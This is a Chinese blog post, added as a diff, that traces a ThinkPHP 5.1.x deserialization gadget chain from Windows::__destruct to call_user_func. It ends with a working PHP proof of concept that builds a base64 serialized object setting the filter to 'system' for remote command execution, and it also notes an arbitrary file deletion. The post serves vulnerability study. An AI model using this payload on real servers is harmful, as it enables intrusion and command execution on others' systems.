@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+  <title>TP5.1.X反序列化分析 | Aruk4s</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="代码审计,Thinkphp,">
+  
+
+  <meta name="description" content="测试环境搭建反序列化漏洞都是基于二次开发形成 125.1.X：composer create-project --prefer-dist topthink/think=5.1.35 tp5.1.35   5.1.XPOP链： \thinkphp\library\think\process\pipes\Windows.php::__destruct() -&amp;gt; \thinkphp\library">
+<meta name="keywords" content="代码审计,Thinkphp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TP5.1.X反序列化分析">
+<meta property="og:url" content="http://yoursite.com/2021/08/12/ThinkPHP5.1.X&&5.2.X/index.html">
+<meta property="og:site_name" content="Aruk4s">
+<meta property="og:description" content="测试环境搭建反序列化漏洞都是基于二次开发形成 125.1.X：composer create-project --prefer-dist topthink/think=5.1.35 tp5.1.35   5.1.XPOP链： \thinkphp\library\think\process\pipes\Windows.php::__destruct() -&amp;gt; \thinkphp\library">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210820162305063.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210818193808753.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210818194215004.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210818195236640.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210818195331153.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210819165328946.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210819165730750.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210819172436139.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210819210223824.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210819212852538.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210819213413216.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210819214339836.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210820112428559.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210820114359668.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210820162236872.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20191002211046-0c03a88e-e516-1.png">
+<meta property="og:updated_time" content="2021-08-29T14:59:31.262Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="TP5.1.X反序列化分析">
+<meta name="twitter:description" content="测试环境搭建反序列化漏洞都是基于二次开发形成 125.1.X：composer create-project --prefer-dist topthink/think=5.1.35 tp5.1.35   5.1.XPOP链： \thinkphp\library\think\process\pipes\Windows.php::__destruct() -&amp;gt; \thinkphp\library">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210820162305063.png">
+
+  
+
+  
+    <link rel="icon" href="/favicon/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbeddx" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-38189205-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+
+</head>
+</html>
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">盒子</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/category/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            分类
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/tag/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/link/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/search/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#测试环境搭建"><span class="toc-text">测试环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-1-X"><span class="toc-text">5.1.X</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞利用"><span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#POC"><span class="toc-text">POC</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考："><span class="toc-text">参考：</span></a></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-ThinkPHP5.1.X&amp;&amp;5.2.X" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">TP5.1.X反序列化分析</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2021.08.12</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>Aruk4s</span>
+        </span>
+      
+
+      
+  <span class="article-category">
+    <i class="icon-list"></i>
+    <a class="article-category-link" href="/categories/漏洞复现/">漏洞复现</a>
+  </span>
+
+
+
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <h2 id="测试环境搭建"><a href="#测试环境搭建" class="headerlink" title="测试环境搭建"></a>测试环境搭建</h2><p><strong>反序列化漏洞都是基于二次开发形成</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">5.1.X：</span><br><span class="line">composer create-project --prefer-dist topthink/think=5.1.35 tp5.1.35</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210820162305063.png" alt="image-20210820162305063"></p>
+<h2 id="5-1-X"><a href="#5-1-X" class="headerlink" title="5.1.X"></a>5.1.X</h2><p>POP链：</p>
+<p><code>\thinkphp\library\think\process\pipes\Windows.php::__destruct()</code> -&gt; <code>\thinkphp\library\think\process\pipes\Windows.php::removeFiles()</code> -&gt; <code>\thinkphp\library\think\model\concern\Conversion.php::__toString()</code> -&gt; <code>\thinkphp\library\think\model\concern\Conversion.php::__toJson()</code> -&gt; <code>\thinkphp\library\think\model\concern\Conversion.php::__toArray()</code> -&gt; <code>\thinkphp\library\think\Request.php::__call()</code> -&gt; <code>\thinkphp\library\think\Request.php::isAjax()</code> -&gt; <code>\thinkphp\library\think\Request.php::param()</code> -&gt; <code>\thinkphp\library\think\Request.php::input()</code> -&gt; <code>\thinkphp\library\think\Request.php::filterValue()</code></p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><ol>
+<li><p>寻找漏洞入口：全局搜索<code>__destruct</code>方法</p>
+<p>在<code>\thinkphp\library\think\process\pipes\Windows.php</code>中找到</p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210818193808753.png" alt="image-20210818193808753"></p>
+<p>这里分别跟进两个函数，<code>close()</code>函数不存在利用点，这里选择跟进<code>removeFiles()</code>函数</p>
+</li>
+<li><p>跟进到<code>removeFiles()</code>，该函数调用了<code>file_exists</code>函数，这里的<code>this-&gt;files</code>可控，是一个任意文件删除漏洞。</p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210818194215004.png" alt="image-20210818194215004"></p>
+</li>
+<li><p>这里考虑到<code>$filename</code>可控，所以可以寻找<code>__toString</code>方法</p>
+<p>在<code>\thinkphp\library\think\model\concern\Conversion.php</code>中找到</p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210818195236640.png" alt="image-20210818195236640"></p>
+</li>
+<li><p>继续跟进<code>__toJson</code></p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210818195331153.png" alt="image-20210818195331153"></p>
+</li>
+<li><p>再跟进到<code>__toArray()</code>，我们需要在<code>__toArry()</code>方法中寻找一个<code>可控变量-&gt;函数（参数可控）</code>的点。</p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210819165328946.png" alt="image-20210819165328946"></p>
+<p>在<code>__toArray()</code>中锁定到<code>$relation-&gt;visible($name)</code>，其中的<code>$relation = this -&gt; getAttr($key)</code>，因为循环<code>foreach</code>中<code>$this-&gt;append</code>可控，所以传入<code>getAttr()</code>中的参数<code>$key</code>，<code>name</code>可控，而我们跟进到<code>getAttr()</code>函数中</p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210819165730750.png" alt="image-20210819165730750"></p>
+<p>在继续跟进到<code>getData()</code>中</p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210819172436139.png" alt="image-20210819172436139"></p>
+<p>因为<code>__toArray</code>中的<code>$key</code>可控，所以<code>getData()</code>中的<code>$name</code>可控。该函数的<code>$this-&gt;data</code>也是可控的，那么将<code>return $this -&gt;data[&#39;$name&#39;]</code>，即<code>relation</code>的值为<code>this-&gt;data[$name]</code>。现在变成了<code>可控变量-&gt;visible(可控)</code></p>
+<p>我们全局搜索<code>visible</code>，一共有三处，但是都不能很好的利用。所以寻找<code>__call</code>方法</p>
+</li>
+<li><p>跟进到<code>\thinkphp\library\think\Request.php</code>中找到<code>__call</code>方法</p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210819210223824.png" alt="image-20210819210223824"></p>
+<p>在<code>__call</code>方法中，可以通过控制变量进入到<code>if</code>循环，调用<code>call_user_func_array</code>。该函数的第一个参数是完全可控的，但是<code>$args</code>会受到一定的限制（<code>array_unshift</code>：把本类对象<code>$this</code>放在数组变量<code>$args</code>的第一个）。在一些老版本的ThinkPHP RCE中通常会利用到<code>input</code>方法。这个地方因为<code>$args</code>不是完全受控，所以我们可以通过另外的方法来间接调用<code>input</code>方法</p>
+</li>
+</ol>
+<ol start="7">
+<li><p>调用<code>input</code>方法的地方很多，我们找到的是<code>param()</code>方法</p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210819212852538.png" alt="image-20210819212852538"></p>
+<p>但是这里的<code>$name</code>由<code>$args</code>决定，但是<code>$arges</code>不可控，所以传入<code>Input</code>的参数不可控。这里我们转换思路，调用<code>input</code>中可以多加几个跳板，所以这里继续搜寻能调用<code>param()</code>函数的方法，并且传入其中的第一个参数可控。</p>
+</li>
+<li><p>跟进到了<code>isAjax()</code></p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210819213413216.png" alt="image-20210819213413216"></p>
+<p>在这里面<code>$this-&gt;config[&#39;var_ajax&#39;]</code>可控，就代表<code>param()</code>中的<code>$name</code>可控，那么传入<code>input()</code>中的<code>$name</code>也是可控的</p>
+</li>
+<li><p>回到<code>input</code>处</p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210819214339836.png" alt="image-20210819214339836"></p>
+<p><code>$this-&gt;param</code>可控，这样前面的就全部穿起来了。通过<code>__call()</code>调用<code>isAjax()</code>，再调用<code>param()</code>，最后到<code>input()</code></p>
+</li>
+<li><p>跟进到<code>input()</code></p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210820112428559.png" alt="image-20210820112428559"></p>
+</li>
+</ol>
+<pre><code>在`input`方法中我们最后想利用的`filterValue`函数，该函数中存在`call_user_func`，可以通过它来达到命令执行的目的。所以我们要注意传入`filterValue`的参数`$data`和`$filter`
+
+进入到`getData`
+
+![image-20210820112522253](https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210820112522253.png)
+
+对`$data`的值进行处理，这里相当于`$data = $data[$val]`，而传入`input`的`$name`可控，最后`data`的值也可控
+
+再跟进到`getFilter`
+
+![image-20210820112819715](https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210820112819715.png)
+
+`$filter`的值可控，为`$this-&gt;filter`，即从`input`的参数`$filter`。
+
+回到`input()`函数中
+
+![image-20210820113940096](https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210820113940096.png)
+
+这个地方是一个回调函数
+
+![image-20210820114032634](https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210820114032634.png)
+
+`$data`为一个数组且**可控**，传入到`filterValue`函数，参数为`$filter`，且参数也**可控**</code></pre><ol start="11">
+<li><p>进入<code>filterValue</code>函数</p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210820114359668.png" alt="image-20210820114359668"></p>
+<p><code>filterValue</code>函数中<code>$value</code>为请求的键，<code>$key</code>为请求的值，这两个参数正好对应传入<code>input</code>中的变量<code>$data</code>为数组，而<code>$filters</code>也是可控的。最后传入<code>call_user_func</code>，完成命令执行。</p>
+</li>
+</ol>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>首先在<code>Model</code>类中，对<code>$append</code>和<code>$data</code>进行赋值，<code>$key</code>要满足不在<code>$relation</code>当中，所以随便定一个值。而要满足<code>$relation</code>为<code>$this-&gt;data[$name]</code>，这里<code>$data</code>的值要和<code>$key</code>相同</p>
+<blockquote>
+<p><code>$append</code>为数组，且决定<code>$name</code>和<code>$key</code>值</p>
+</blockquote>
+<p><code>$name</code>的赋值要调用到<code>__call</code>函数，且为<code>__call()</code>函数的<code>$args</code>，想要调用<code>call_user_func_array</code>，这里的<code>$this-&gt;hook</code>键设置为<code>visable</code>和<code>$method</code>相同进入循环。</p>
+<p>再赋值hook函数的值为<code>isAjax</code>，再通过设置<code>config[&#39;var_ajax&#39;]</code>进入到<code>param()</code>函数，再到<code>input</code>，最后进入<code>filterValue</code>，调用<code>call_user_func</code>达到命令执行</p>
+<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $append = [];</span><br><span class="line">    <span class="keyword">private</span> $data = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append = [<span class="string">"xmhgg"</span>=&gt;[<span class="string">"ls"</span>,<span class="string">""</span>]];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = [<span class="string">"xmhgg"</span>=&gt;<span class="keyword">new</span> Request()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $hook = [];</span><br><span class="line">    <span class="keyword">protected</span> $filter;</span><br><span class="line">    <span class="keyword">protected</span> $config = [</span><br><span class="line">        <span class="comment">// 表单请求类型伪装变量</span></span><br><span class="line">        <span class="string">'var_method'</span>       =&gt; <span class="string">'_method'</span>,</span><br><span class="line">        <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">        <span class="string">'var_ajax'</span>         =&gt; <span class="string">'_ajax'</span>,</span><br><span class="line">        <span class="comment">// 表单pjax伪装变量</span></span><br><span class="line">        <span class="string">'var_pjax'</span>         =&gt; <span class="string">'_pjax'</span>,</span><br><span class="line">        <span class="comment">// PATHINFO变量名 用于兼容模式</span></span><br><span class="line">        <span class="string">'var_pathinfo'</span>     =&gt; <span class="string">'s'</span>,</span><br><span class="line">        <span class="comment">// 兼容PATH_INFO获取</span></span><br><span class="line">        <span class="string">'pathinfo_fetch'</span>   =&gt; [<span class="string">'ORIG_PATH_INFO'</span>, <span class="string">'REDIRECT_PATH_INFO'</span>, <span class="string">'REDIRECT_URL'</span>],</span><br><span class="line">        <span class="comment">// 默认全局过滤方法 用逗号分隔多个</span></span><br><span class="line">        <span class="string">'default_filter'</span>   =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="comment">// 域名根，如thinkphp.cn</span></span><br><span class="line">        <span class="string">'url_domain_root'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="comment">// HTTPS代理标识</span></span><br><span class="line">        <span class="string">'https_agent_name'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="comment">// IP代理获取标识</span></span><br><span class="line">        <span class="string">'http_agent_ip'</span>    =&gt; <span class="string">'HTTP_X_REAL_IP'</span>,</span><br><span class="line">        <span class="comment">// URL伪静态后缀</span></span><br><span class="line">        <span class="string">'url_html_suffix'</span>  =&gt; <span class="string">'html'</span>,</span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filter = <span class="string">"system"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config = [<span class="string">"var_ajax"</span>=&gt;<span class="string">''</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hook = [<span class="string">"visible"</span>=&gt;[<span class="keyword">$this</span>,<span class="string">"isAjax"</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files=[<span class="keyword">new</span> Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Windows()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/image-20210820162236872.png" alt="image-20210820162236872"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>5.1.X的反序列化，也是和老版本的<code>input</code>利用类似，只不过找了其他的跳板进入漏洞点。审计的核心思想就是：找到危险函数，然后危险函数的参数是否可控，如果不可控能否绕过，如果可控怎样绕过前置条件传递参数。</p>
+<p><img src="https://raw.githubusercontent.com/Aruk4s/PicGo/main/img/20191002211046-0c03a88e-e516-1.png" alt="20191002211046-0c03a88e-e516-1"></p>
+<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://xz.aliyun.com/t/6467#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/6467#toc-1</a></p>
+
+    
+  </div>
+
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">Have Fun</span>
+      <div class="donation-body">
+        <div class="tip text-center">by Aruk4s</div>
+        <ul>
+        
+          <li class="item">
+            
+            <img src="/images/1.png" alt="">
+          </li>
+        
+          <li class="item">
+            
+            <img src="/images/2.png" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2021/08/03/ThinkPHP3.2.3/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="show pull-right" href="/2021/08/17/反射/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/category/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/tag/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/search/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              搜索
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
